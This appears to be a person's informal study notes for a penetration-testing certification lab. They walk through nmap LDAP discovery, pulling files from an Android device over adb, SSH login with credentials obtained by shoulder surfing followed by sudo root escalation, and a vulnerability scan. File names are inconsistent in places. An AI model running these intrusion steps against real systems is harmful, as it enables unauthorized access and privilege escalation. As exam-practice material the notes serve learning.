FQDN

Find the fqdn of a domain controller in a subnet

	Using nmap
		1. Find the alive hosts and send it to a file
			nmap -p389 -sV -iL <target_list>
			
		Port 389 - is where LDAP service is running	
		
			If you already know the IP where LDAP is running
			
			nmap -sV -p389 <IP>
			
	Lets say the result was:

		port		state		service		version
		389/TCP		open		ldap		Microsoft Active Directory LDAP (Domain: pentester.team., Site: default-...
		Service Info: Host: DC, OS: Windows; CPE; cpe:/o:microsoft windows

An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. Yiu are assigned to 
covertly access the users device to obtain

		Malicious elf files stored in a folder "scan"
		Perform deel scan on the elf files to obtain de last 4 digits of the SHA384 hash file of the file with the highest
		entropy value
		
		We already connect with adb to the target - in port 5555
		
			adb connect 192.168.56.12:5555
			adb shell
			cd sdcard
			cd scan
				ls
				file1.elf
				file3.elf
				file3.elf
				
			first we need to move this folder to our machine
				we copy the path were the files are /sdcard/scan
			
			adb pull /sdcard/scan dd/			dd/ is get root permissions
			
			a scan folder id created in our machine with the .elf files
			
			cd scan
				ls
				file1.elf
				file3.elf
				file3.elf
	
		Now we need to calculate de entropy and see which of the files has the highest entropy value
				ent file1.txt			
		 	ent file2.txt
			
			ent file3.txt
			
		With this tool we get different Entropy values

		Now that we have the file with the hig entropy (lets say is file1.txt),
			sha384sum file1.txt
			
			it generates a hash:
			fsdflklkjlksljkjflksdfljlskdjflksdjflskdklkfjslkdjfslkdfdffdfddfe344543ef
			
		so to answer the question, the last four digits are: 43ef
		
		
Priviledge Escalation
Example:

Q1 - You used shoulder surfing to identify the username and password of a user on the Ubuntu machine in the 192.168.0.0/24 network that is kali and pass@123. Access the target machine , 
perform vertical escalation to that of a root user and enter the content of the imroot.txt file as the answer.

	nmap -sV -p 22 192.168.0.0/24
	
	after we identify the ip with port 22 open and running linux, we enter with
	
		ssh kali@192.168.0.1
		
		use the given password pass@123
		
			Now that we are in lets see what we can do if we were sudo
			
			sudo -l
			
			Lets try to get root
			
			sudo -i
			
			If it is accepted by the system
			
			whoami
			
			root
			
			Great, let find the file...
			
				find . -name imroot.txt

CVE and CVSS

Q - Perform a vulnerability scan for the host with ip address 192.168.56.21. What is the severity score of a vulnerability tha indicates
 the EOL od a web development language platform?
 
	nmap -Pn --script vuln 192.168.56.21
	
	In the found CVE's look for one that mentions EOL, out of date... If not copy the CVE and look on google.
	
	Then in the NVD database look for the CVSS.
